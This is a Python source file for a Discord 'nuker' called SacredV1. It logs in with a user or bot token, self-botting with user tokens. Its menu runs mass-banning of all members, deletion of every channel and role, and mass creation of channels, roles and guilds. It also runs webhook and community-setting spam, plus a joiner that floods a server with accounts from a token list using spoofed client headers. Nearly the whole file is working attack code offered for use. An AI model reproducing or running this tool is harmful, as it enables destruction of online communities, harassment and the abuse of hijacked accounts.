import discord 
from discord.ext import commands
import os
import asyncio
import aiohttp
import requests
import random
from datetime import datetime
import threading
import itertools
import time, sys
from colorama import Fore
import urllib3, tasksio
from requests_futures.sessions import FuturesSession
from typing import Optional
from pystyle import Colors, Colorate, Center
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Back
import fade



os.system(f'cls & mode 80, 20 & title Token Login')

banner = Center.XCenter('''


╔╦╦═╦═╦═╗
║╔╣╬║╬║╩╣
╚╝╚═╣╔╩═╝
────╚╝
                                                                  
         Made by: fymjosh#7869
        Github: https://github.com/SurvivorJosh
''')


print(Colorate.Vertical(Colors.purple_to_red, banner))
print()



token = input(f'Token: ')

now = datetime.now()
current_time = now.strftime("%H:%M:%S")
try:
    os.system('cls')
except:
    os.system('clear')

def check_token():
    if requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": f'{token}'}).status_code == 200:
        return "user"
    else:
        return "bot"




intents = discord.Intents.all()
token_type = check_token()
if token_type == "user":
    headers = {'Authorization': f'{token}'}
    client = commands.Bot(command_prefix=">", case_insensitive=False, self_bot=True, intents=intents)
elif token_type == "bot":
    headers = {'Authorization': f'Bot {token}'}
    client = commands.Bot(command_prefix=">", case_insensitive=False, intents=intents)
    
client.remove_command("help")

class ShiraXJosh:
    def __init__(self):
        now = datetime.now()
        current_time = now.strftime("%H:%M:%S")
        self.member_count = 0
        self.channel_count = 0
        self.role_count = 0
        self.proxylist=[]
        self.webhook_url = []
        self.color = '\x1b[38;5;56m'
        self.fade = Colors.purple_to_blue
        
        
        self.colors = [
            Colors.yellow_to_green, Colors.green_to_cyan, Colors.cyan_to_blue, Colors.blue_to_purple, Colors.purple_to_red, Colors.red_to_green, Colors.green_to_yellow
        ]
        
        
    async def token_joiner(self, token, inv):
        r_headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0',
            'Accept': '*/*',
            'Accept-Language': 'fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3',
            'Accept-Encoding': 'gzip, deflate, br',
            'Content-Type': 'application/json',
            'X-Context-Properties': 'eyJsb2NhdGlvbiI6IkpvaW4gR3VpbGQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijk4OTkxOTY0NTY4MTE4ODk1NCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI5OTAzMTc0ODgxNzg4NjgyMjQiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjB9',
            'Authorization': token,
            'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRmlyZWZveCIsImRldmljZSI6IiIsInN5c3RlbV9sb2NhbGUiOiJmciIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wIiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTAyLjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTM2MjQwLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==',
            'X-Discord-Locale': 'en-US',
            'X-Debug-Options': 'bugReporterEnabled',
            'Origin': 'https://discord.com',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Referer': 'https://discord.com',
            'Cookie': '__dcfduid=21183630021f11edb7e89582009dfd5e; __sdcfduid=21183631021f11edb7e89582009dfd5ee4936758ec8c8a248427f80a1732a58e4e71502891b76ca0584dc6fafa653638; locale=en-US',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'TE': 'trailers',
        }
        t_headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9001 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36',
            'accept': '*/*',
            'accept-language': 'en-US',
            'Content-Type': 'application/json',
            'X-Context-Properties': 'eyJsb2NhdGlvbiI6IkpvaW4gR3VpbGQiLCJsb2NhdGlvbl9ndWlsZF9pZCI6Ijk4OTkxOTY0NTY4MTE4ODk1NCIsImxvY2F0aW9uX2NoYW5uZWxfaWQiOiI5OTAzMTc0ODgxNzg4NjgyMjQiLCJsb2NhdGlvbl9jaGFubmVsX3R5cGUiOjB9',
            'Authorization': token,
            'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRmlyZWZveCIsImRldmljZSI6IiIsInN5c3RlbV9sb2NhbGUiOiJmciIsImJyb3dzZXJfdXNlcl9hZ2VudCI6Ik1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQ7IHJ2OjEwMi4wKSBHZWNrby8yMDEwMDEwMSBGaXJlZm94LzEwMi4wIiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTAyLjAiLCJvc192ZXJzaW9uIjoiMTAiLCJyZWZlcnJlciI6IiIsInJlZmVycmluZ19kb21haW4iOiIiLCJyZWZlcnJlcl9jdXJyZW50IjoiIiwicmVmZXJyaW5nX2RvbWFpbl9jdXJyZW50IjoiIiwicmVsZWFzZV9jaGFubmVsIjoic3RhYmxlIiwiY2xpZW50X2J1aWxkX251bWJlciI6MTM2MjQwLCJjbGllbnRfZXZlbnRfc291cmNlIjpudWxsfQ==',
            'X-Discord-Locale': 'en-US',
            'X-Debug-Options': 'bugReporterEnabled',
            'origin': 'https://discord.com',
            'DNT': '1',
            'connection': 'keep-alive',
            'Referer': 'https://discord.com',
            'cookie': f'__cfduid={os.urandom(43).hex()}; __dcfduid={os.urandom(32).hex()}; locale=en-US',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'TE': 'Trailers',
        }
        f_headers = {"Authorization": token, "accept": "*/*", "accept-language": "en-US", "connection": "keep-alive", "cookie": f'__cfduid={os.urandom(43).hex()}; __dcfduid={os.urandom(32).hex()}; locale=en-US', "DNT": "1", "origin": "https://discord.com", "sec-fetch-dest": "empty", "sec-fetch-mode": "cors", "sec-fetch-site": "same-origin", "referer": "https://discord.com/channels/@me", "TE": "Trailers", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9001 Chrome/83.0.4103.122 Electron/9.3.5 Safari/537.36", "X-Super-Properties": ""}
        async with aiohttp.ClientSession() as s:
            async with s.post(f"https://canary.discord.com/api/v9/invites/{inv}", headers=r_headers, json={}) as res:
                if res.status in [200, 201, 204]:
                    print(f"{self.color}[\033[37m{current_time}{self.color}]\033[37m Successfully joined server")
                elif res.status == 429:
                    f = await res.json()
                    print(f'{self.color}[\033[37m{current_time}{self.color}]\033[37m Ratelimited, retrying in {f["retry_after"]}')
                elif res.status == 403:
                    print(f'{self.color}[\033[37m{current_time}{self.color}]\033[37m Error, token was locked')
                    
                elif res.status == 404:
                    #print(f"{self.color}[\033[37m{current_time}{self.color}]\033[37m Error couldn't join lol")
                    async with aiohttp.ClientSession() as s:
                        async with s.post(f"https://discordapp.com/api/v9/invites/{inv}", headers=t_headers, json={}) as r:
                            if r.status in [200, 201, 204]:
                                print(f"{self.color}[\033[37m{current_time}{self.color}]\033[37m Successfully joined server")
                            elif r.status == 429:
                                f = await r.json()
                                print(f'{self.color}[\033[37m{current_time}{self.color}]\033[37m Ratelimited, retrying in {f["retry_after"]}')
                            elif r.status == 403:
                                print(f'{self.color}[\033[37m{current_time}{self.color}]\033[37m Error, token was locked')
                            else:
                                print(f"{self.color}[\033[37m{current_time}{self.color}]\033[37m Error couldn't join lol")
                         
                else:
                    print(f"{self.color}[\033[37m{current_time}{self.color}]\033[37m Error couldn't join lol")
    async def mass_join(self):
        print("Make sure you have valid tokens in tokens.txt")
        inv = input("server invite link -> ")
        tokens = open("tokens.txt", "r").readlines()
        async with tasksio.TaskPool(10_000) as pool:
            for token in tokens:
                tok = token.strip()
                await pool.put(self.token_joiner(tok, inv))
                        
        
    def guild_create(self, name):
        now = datetime.now()
        current_time = now.strftime("%H:%M:%S")
        if token_type == "bot":
            return print("Client is a bot! Try a account token")
       
        elif token_type == "user":
            while True:
            
                session = requests.Session()
                r = session.post("https://discord.com/api/v9/guilds", headers=headers, json={'name': name})
                if r.status_code == 429:
                    retry = r.json()
                    print(f"{self.color}[\033[37m{current_time}{self.color}]\033[37m Ratelimited retrying in {retry['retry_after']}s ..")
                    time.sleep(retry['retry_after'])
                else:
                    if r.status_code in [200, 201, 204]:
                   
                        print(f"{self.color}[\033[37m{current_time}{self.color}]\033[37m Created Guild {name}")
                       
                        break
                    else:
                        break
                        
                        
    async def CreateGuilds(self):
        name = input("Guild name: ")
        amount = input("Amount: ")
        for i in range(int(amount)):
            threading.Thread(target=self.guild_create, args=(name,)).start()
            
            
            
            
    def spamhook(self, hook, message):
       
        for i in range(100):
            http = urllib3.PoolManager()
            try:
                http.request("POST", hook, fields={'content': message})
                
            except:
                print(f'{self.color}[\033[37m{current_time}{self.color}]\033[37m error spamming {hook}')
                
    
     
    def webhook_create(self, guild, channel, name):
       
        while True:
            session = requests.Session()
            r = session.post(f"https://discord.com/api/v9/channels/{channel}/webhooks", headers=headers, json={'name': name})
            if r.status_code == 429:
                retry = r.json()
                print(f"{self.color}[\033[37m{current_time}{self.color}]\033[37m Ratelimited retrying in {retry['retry_after']}s ..")
                time.sleep(retry['retry_after'])
            else:
                if r.status_code in [200, 201, 204]:
                   
                    print(f"{self.color}[\033[37m{current_time}{self.color}]\033[37m Created Webhook {name}")
                    return r.json()
                
                else:
                    break
                    
                    
    def webhook_message(self, guild, url, content, name):
        while True:
            session = requests.Session()
            r = session.post(url, json={'content': content, 'username': name, 'avatar_url': 'https://media.discordapp.net/attachments/1010985094992896133/1021875108010262528/IMG_2056.png'})
            if r.status_code == 429:
                retry = r.json()
                print(f"[{current_time}] Ratelimited retrying in {retry['retry_after']}s ..")
                time.sleep(retry['retry_after'])
            else:
                if r.status_code in [200, 201, 204]:
                    print(f"[{current_time}] Sent Message {content}")
                    break
                else:
                    break
                    
    async def WebhookSpam(self):
        
        guild = input('Guild Id: ')
        name = input('Webhook name: ')
        content = input('Message: ')
        await client.wait_until_ready()
        guildOBJ = client.get_guild(int(guild))
        channels = guildOBJ.channels
        thread = []
        
        for channel in channels:
           
            try:
                async with aiohttp.ClientSession() as nuker:
                    async with nuker.post(f'https://discord.com/api/v9/channels/{channel.id}/webhooks', headers=headers, json={"name": name}) as r:
                        webhook_raw = await r.json()
                        webhook = f'https://discord.com/api/webhooks/{webhook_raw["id"]}/{webhook_raw["token"]}'
                       
                        threading.Thread(target=self.spamhook, args=(webhook, content,)).start()
                       
            except:
                print(f'you ratelimited asf lil boa')
                
        
        
     
       
     
    def disable_com(self, guild):
     
        a = {
            "description": None,
            "features": ["NEWS"],
            "preferred_locale": "en-US",
            "rules_channel_id": None,
            "public_updates_channel_id": None
        }
        try:
            r = requests.patch(f"https://discord.com/api/v9/guilds/{guild}", headers=headers, json=a)
            t = [200, 201, 204]
            if r.status_code in t:
                print(f"{self.color}[\033[37m{current_time}{self.color}]\033[37m Disabled Community")
            elif r.status_code == 429:
                b = r.json()
                print(f"{self.color}[\033[37m{current_time}{self.color}]\033[37m RateLimited, retrying in {b['retry_after']}s ..")
                time.sleep(b['retry_after'])
        except:
            pass     
        
    def enable_com(self, guild):
       
        a2 = {
            "features": ["COMMUNITY"],
            "preferred_locale": "en-US",
            "rules_channel_id": "1",
            "public_updates_channel_id": "1"
        }
        
        try:
            r = requests.patch(f"https://discord.com/api/v9/guilds/{guild}", headers=headers, json=a2)
            t = [200, 201, 204]
            if r.status_code in t:
                print(f"{self.color}[\033[37m{current_time}{self.color}]\033[37m Enabled Community")
            elif r.status_code == 429:
                b = r.json()
                print(f"{self.color}[\033[37m{current_time}{self.color}]\033[37m RateLimited, retrying in {b['retry_after']}s ..")
                time.sleep(b['retry_after'])
        except:
            pass
        
    def CommunityFlood(self, guild):
       
       
        a = {
            "description": None,
            "features": ["NEWS"],
            "preferred_locale": "en-US",
            "rules_channel_id": None,
            "public_updates_channel_id": None
        }
        a2 = {
            "features": ["COMMUNITY"],
            "preferred_locale": "en-US",
            "rules_channel_id": "1",
            "public_updates_channel_id": "1"
        }

        while True:
            try:
                r = requests.patch(f"https://discord.com/api/v9/guilds/{guild}", headers=headers, json=a2)
                t = [200, 201, 204]
                if r.status_code in t:
                    print(f"{self.color}[\033[37m{current_time}{self.color}]\033[37m Created Community")
                   
                    
                elif r.status_code == 429:
                    b = r.json()
                    print(f"{self.color}[\033[37m{current_time}{self.color}]\033[37m RateLimited, retrying in {b['retry_after']} seconds")
                   
                    time.sleep(b['retry_after'])
                    
            except:
                pass
            try:
                r = requests.patch(f"https://discord.com/api/v9/guilds/{guild}", headers=headers, json=a)
                t = [200, 201, 204]
                if r.status_code in t:
                    print(f"{self.color}[\033[37m{current_time}{self.color}]\033[37m Disabled Community")
                    
                elif r.status_code == 429:
                    b = r.json()
                   
                    print(f"{self.color}[\033[37m{current_time}{self.color}]\033[37m RateLimited, retrying in {b['retry_after']}s ..")
                    
                    time.sleep(b['retry_after'])
            except:
                pass    
        
    async def community_settings(self):
        guild = input("Guild Id: ")
        try:
            os.system('cls')
        except:
            os.system('clear')
            
        print("""
        
        1. Enable Community
        
        2. Disable Community
        
        3. Spam Community
        
        
        """)
        
        choice = input("Choose: ")
        if choice == "1" or choice == "one":
            threading.Thread(target=self.enable_com, args=(guild,)).start()
        elif choice == "2" or choice == "two":
            threading.Thread(target=self.disable_com, args=(guild,)).start()
        elif choice == "3" or choice == "three":
            for i in range(9):
                threading.Thread(target=self.CommunityFlood, args=(guild,)).start()
        
       
    def create_role(self, guild, name):
       
        while True:
            json = {
                'name': name
            }
            session = requests.Session()
            r = session.post(f"https://discord.com/api/v9/guilds/{guild}/roles", headers=headers, json=json)
            if r.status_code == 429:
                retry = r.json()
                print(f"{self.color}[\033[37m{current_time}{self.color}]\033[37m Ratelimited retrying in {retry['retry_after']}s..")
                time.sleep(retry['retry_after'])
            else:
                if r.status_code in [200, 201, 204]:
                    print(f"{self.color}[\033[37m{current_time}{self.color}]\033[37m Created Role {name}")
                    break
                else:
                    break
    
    async def SpamRoles(self):
       
        guild = input("Guild Id: ")
        name = input("Role name: ")
        amount = input("Amount: ")
        for i in range(int(amount)):
            threading.Thread(target=self.create_role, args=(guild, name)).start()
                    
    def create_chan(self, guild, name, type:int):
    
        while True:
            json = {
                'name': name,
                'type': type
            }
            session = requests.Session()
            r = session.post(f"https://discord.com/api/v9/guilds/{guild}/channels", headers=headers, json=json)
            if r.status_code == 429:
                retry = r.json()
                print(f"{self.color}[\033[37m{current_time}{self.color}]\033[37m Ratelimited retrying in {retry['retry_after']}s ..")
                time.sleep(retry['retry_after'])
            else:
                if r.status_code in [200, 201, 204]:
                    print(f"{self.color}[\033[37m{current_time}{self.color}]\033[37m Created Channel {name}")
                    break
                else:
                    break
                    
                    
    async def create_and_spam(self, amount:int, channel_name, message, webhook_name, guild):
        async with aiohttp.ClientSession() as nuker:
            for i in range(amount):
                channel = await nuker.post(f"https://discord.com/api/v9/guilds/{guild}/channels", headers=headers, json={"name": channel_name, "type": 0})
                data_channel = await channel.json()
                channel_id = data_channel["id"]
                try:
                    async with nuker.post(f"https://discord.com/api/v9/channels/{channel_id}/webhooks", header=headers, json={"name": webhook_name}) as r:
                        webhook_raw = await r.json()
                        webhook = f'https://discord.com/api/webhooks/{webhook_raw["id"]}/{webhook_raw["token"]}'
                        threading.Thread(target=self.spamhook, args=(webhook, message,)).start()
                except:
                    print("ratelimited asf boa")
                    
    def text_chan(self, guild, name):
        while True:
            json = {
                'name': name,
                'type': 0
            }
            session = requests.Session()
            r = session.post(f"https://discord.com/api/v9/guilds/{guild}/channels", headers=headers, json=json)
            if r.status_code == 429:
                retry = r.json()
                print(f"{self.color}[\033[37m{current_time}{self.color}]\033[37m Ratelimited retrying in {retry['retry_after']}s ..")
                time.sleep(retry['retry_after'])
            else:
                if r.status_code in [200, 201, 204]:
                    print(f"{self.color}[\033[37m{current_time}{self.color}]\033[37m Created Channel {name}")
                    break
                else:
                    break
                    
                    
                    
    async def SpamChannels(self):
        guild = input("Guild Id:  ")
        name = input("Channel Names: ")
        try:
            os.system('cls')
        except:
            os.system('clear')
            
        print(Colorate.Horizontal(Colors.rainbow, """
        
        Channel Types        |       Type       
        -----------------    |     --------
        Text Channels        |        0
        -----------------    |     --------
        Voice Channels       |        2
        -----------------    |     -------- 
        Category Channels    |        4
        -----------------    |     --------
        Annoucement Guild    |        5
        -----------------    |     --------
        Stage Channels       |        13
        -----------------    |     --------
        Forum Channels       |        15
        -----------------    |     --------
        """))
        type = 0
        ty = input("Channel Type:  ")
        amount = input("Amount: ")
        if ty == None or ty == "0":
            type = 0
        elif ty == "2":
            type = 2
        elif ty == "4":
            type = 4
        elif ty == "5":
            type = 5
        elif ty == "13":
            type = 13
        elif ty == "15":
            type = 15
        
        for i in range(int(amount)):
            threading.Thread(target=self.create_chan, args=(guild, name, type,)).start()

    def del_role(self, guild, role):
        while True:
            session = requests.Session()
            r = session.delete(f"https://discord.com/api/v9/guilds/{guild}/roles/{role}", headers=headers)
            if r.status_code == 429:
                retry = r.json()
                print(f"{self.color}[\033[37m{current_time}{self.color}]\033[37m Ratelimited retrying in {retry['retry_after']}s ..")
                time.sleep(retry['retry_after'])
            else:
                if r.status_code in [200, 201, 204]:
                    print(f"{self.color}[\033[37m{current_time}{self.color}]\033[37m Deleted Role {role}")
                    break
                else:
                    break
    
    async def deleteRoles(self):
        guild = input("Guild Id: ") 
        threads = []
        await client.wait_until_ready()
        guildOBJ = client.get_guild(int(guild))
        roles = guildOBJ.roles
        for role in roles:
            threading.Thread(target=self.del_role, args=(guild, role.id,)).start()
            
        
        
    def ban_mem(self, guild, member):
        #session = FuturesSession(max_workers = 350)
        session = requests.Session()
        while True:
            now = datetime.now()
            current_time = now.strftime("%H:%M:%S")
            r = session.put(f"https://discord.com/api/v9/guilds/{guild}/bans/{member}", headers=headers)
            #r = f.result()
            if r.status_code == 429:
                retry = r.json()
                print(f"{self.color}[\033[37m{current_time}{self.color}]\033[37m Ratelimited retrying in {retry['retry_after']}s ..")
                time.sleep(retry['retry_after'])
            else:
                if r.status_code in [200, 201, 204]:
                    print(f"{self.color}[\033[37m{current_time}{self.color}]\033[37m Banned {member}")
                    break
                    
                else:
                    break
                    
    
    async def banAll(self):
        guild = input('Guild Id: ')
        threads = []
        await client.wait_until_ready()
        guildOBJ = client.get_guild(int(guild))
        members = guildOBJ.members
        for member in members:
            t = threading.Thread(target=self.ban_mem, args=(guild, member.id,)).start()
            
            #threads.append(t)
            #t.start()
            
            
        #for t in threads:
        #    try: 
        #        t.join()
        #    except:
        #        pass

                    
                    
                    
    
            
        
    def del_chan(self, guild, channel):
        
        session = requests.Session()
        while True:
            
            current_time = now.strftime("%H:%M:%S")
            r = session.delete(f"https://discord.com/api/v9/channels/{channel}", headers = headers)
            
            if r.status_code == 429:
                retry = r.json()['retry_after']
                print(f"{self.color}[\033[37m{current_time}{self.color}]\033[37m Ratelimited, retrying in {retry}")
                time.sleep(retry)
                
            else:
                if r.status_code in [200, 201, 204]:
                    print(f"{self.color}[\033[37m{current_time}{self.color}]\033[37m Deleted Channel {channel}")
                    break
                    
                else:
                    break
        
        
                    
    async def deleteChannels(self):
        
        Threads = []
        guild = input('Guild Id: ')
        await client.wait_until_ready()
        guildOBJ = client.get_guild(int(guild))
        channels = guildOBJ.channels
       
        for channel in channels:
            t = threading.Thread(target=self.del_chan, args=(guild, channel.id,)).start()
                
        
            #Threads.append(t)
            
        #for t in Threads:
        #    try: 
        #        t.join()
        #    except:
        #        pass
            
       
                       
    async def NukeServer(self):
        Threads = []
        guild = input("Guild Id: ")
        create_andspam = False
       
       
            
        
        channel_name = input("Channel name: ")
        channel_amount = input("Channel amount: ")
        role_name = input("Role name: ")
        role_amount = input("Role amount: ")
            
        await client.wait_until_ready()
        guildOBJ = client.get_guild(int(guild))
        channels = guildOBJ.channels
        roles = guildOBJ.roles
        members = guildOBJ.members
        amt = len(roles) + len(members) + len(channels)
      
        for channel in channels:
            threading.Thread(target=self.del_chan, args=(guild, channel.id,)).start()
            
        for member in members:
            threading.Thread(target=self.ban_mem, args=(guild, member.id,)).start()
            
        for role in roles:
            threading.Thread(target=self.del_role, args=(guild, role.id,)).start()
            
        for i in range(int(channel_amount)):
            threading.Thread(target=self.text_chan, args=(guild, channel_name,)).start()
           
        for i in range(int(role_amount)):
            threading.Thread(target=self.create_role, args=(guild, role_name,)).start()
                
        
        
    async def ThemeChanger(self):
        os.system(f'cls & mode 80, 20 & title  [SacredV1] Theme Changer (Credits: Avery Nuker)')
        members_count = 0
        for g in client.guilds:
            member_count = len(g.members)
        banner2 = Center.XCenter(f'''

                                _________      ______
_____________ ________________________  /__   ___<  /
__  ___/  __ `/  ___/_  ___/  _ \  __  /__ | / /_  / 
_(__  )/ /_/ // /__ _  /   /  __/ /_/ / __ |/ /_  /  
/____/ \__,_/ \___/ /_/    \___/\__,_/  _____/ /_/   
                                                     
        ''')

        print(Colorate.Horizontal(self.fade, banner2))
        print(f'''
            
        {self.color}(\033[37m1{self.color})\033[37m Red/Purple          {self.color}(\033[37m5{self.color})\033[37m Yellow/Red         {self.color}(\033[37mm{self.color})\033[37m Menu
        {self.color}(\033[37m2{self.color})\033[37m Green/Cyan          {self.color}(\033[37m6{self.color})\033[37m Yellow/Green       {self.color}(\033[37mx{self.color})\033[37m Exit
        {self.color}(\033[37m3{self.color})\033[37m Blue/Cyan           {self.color}(\033[37m7{self.color})\033[37m Cyan/Green
        {self.color}(\033[37m4{self.color})\033[37m Green/Yellow        {self.color}(\033[37m8{self.color})\033[37m Red/Yellow
 
        ''')
        
        choice = input(f"({self.color}@\033[37m{client.user.name}) → ")        
        if choice == "1" or choice == "one":
            self.color = '\x1b[38;5;196m'
            self.fade = Colors.red_to_purple
           
            await self.Menu()
        elif choice == "2" or choice == "two":
            self.color = '\x1b[38;5;34m'
            self.fade = Colors.green_to_cyan
           
            await self.Menu()
            
        elif choice == "4" or choice == "four":
            self.color = '\x1b[38;5;34m'
            self.fade = Colors.green_to_yellow
          
            await self.Menu()
            
        elif choice == "3" or choice == "three":
            self.color = '\x1b[38;5;21m'
            self.fade = Colors.blue_to_cyan
            
            await self.Menu()
            
        elif choice == "5" or choice == "five":
            self.color = '\x1b[38;5;142m'
            self.fade = Colors.yellow_to_red
            
            await self.Menu()
            
        elif choice == "6" or choice == "six":
            self.color = '\x1b[38;5;142m'
            self.fade = Colors.yellow_to_green
            
            await self.Menu()
            
        elif choice == "7" or choice == "seven":
            self.color = '\x1b[38;5;51m'
            self.fade = Colors.cyan_to_green
            
            await self.Menu()
            
        elif choice == "8" or choice == "eight":
            self.color = '\x1b[38;5;196m'
            self.fade = Colors.red_to_yellow
          
            await self.Menu()
            
        elif choice == "m" or choice == "menu":
           
            await self.Menu()    
            
            
        elif choice == "X" or choice == "x":
            os._exit(0)
        
    
            
    async def Menu(self):
        os.system(f'cls & mode 80, 20 & title  [SacredV1] Connected with {client.user}')
        members_count = 0
        for g in client.guilds:
            member_count = len(g.members)
        banner2 = Center.XCenter(f'''

                                _________      ______
_____________ ________________________  /__   ___<  /
__  ___/  __ `/  ___/_  ___/  _ \  __  /__ | / /_  / 
_(__  )/ /_/ // /__ _  /   /  __/ /_/ / __ |/ /_  /  
/____/ \__,_/ \___/ /_/    \___/\__,_/  _____/ /_/   
                                                     
        ''')

        print(Colorate.Horizontal(self.fade, banner2))
        print(f'''
            
   {self.color}(\033[37m1{self.color})\033[37m Ban All             {self.color}(\033[37m2{self.color})\033[37m Delete Channels         {self.color}(\033[37m9{self.color})\033[37m Webhook Spam
   {self.color}(\033[37m3{self.color})\033[37m Delete Roles        {self.color}(\033[37m4{self.color})\033[37m Create Channels         {self.color}(\033[37m10{self.color})\033[37m Mass Token Joiner
   {self.color}(\033[37m5{self.color})\033[37m Create Roles        {self.color}(\033[37m6{self.color})\033[37m Community Settings      {self.color}(\033[37m11{self.color})\033[37m Change Theme
   {self.color}(\033[37m7{self.color})\033[37m Nuke Server         {self.color}(\033[37m8{self.color})\033[37m Create Guilds
 
        ''')
        
        choice = input(f"({self.color}@\033[37m{client.user.name}) → ")
        if choice == "1" or choice == "one":
            await self.banAll()
            await asyncio.sleep(2)
            await self.Menu()
            
        elif choice == "2" or choice == "two":
            await self.deleteChannels()
            await asyncio.sleep(2)
            await self.Menu()
            
            
        elif choice == "4" or choice == "four":
            await self.SpamChannels()
            await asyncio.sleep(2)
            await self.Menu()
            
        elif choice == "3" or choice == "three":
            await self.deleteRoles()
            await asyncio.sleep(2)
            await self.Menu()
            
        elif choice == "5" or choice == "five":
            await self.SpamRoles()
            await asyncio.sleep(2)
            await self.Menu()
            
        elif choice == "6" or choice == "six":
            await self.community_settings()
            await asyncio.sleep(2)
            await self.Menu()
            
        elif choice == "7" or choice == "seven":
            await self.NukeServer()
            await asyncio.sleep(2)
            await self.Menu()
            
        elif choice == "8" or choice == "eight":
            await self.CreateGuilds()
            await asyncio.sleep(3)
            await self.Menu()
            
        elif choice == "9" or choice == "nine":
            await self.WebhookSpam()
            await asyncio.sleep(3)
            await self.Menu()    
            
        elif choice == "10" or choice == "ten":
            await self.mass_join()
            await asyncio.sleep(3)
            await self.Menu()

        elif choice == "11" or choice == "eleven":
            await self.ThemeChanger()
           
        elif choice == "X" or choice == "x":
            os._exit(0)
        
    @client.event
    async def on_ready():
        await ShiraXJosh().Menu()
    
    def startup(self):
        try:
            if token_type == "user":
                client.run(token, bot=False)
            elif token_type == "bot":
                client.run(token)
            
        except:
            print(f'Invalid Token')
            input()
            time.sleep(2)
            os._exit(0)
            
if __name__ == "__main__":

    ShiraXJosh().startup()
        
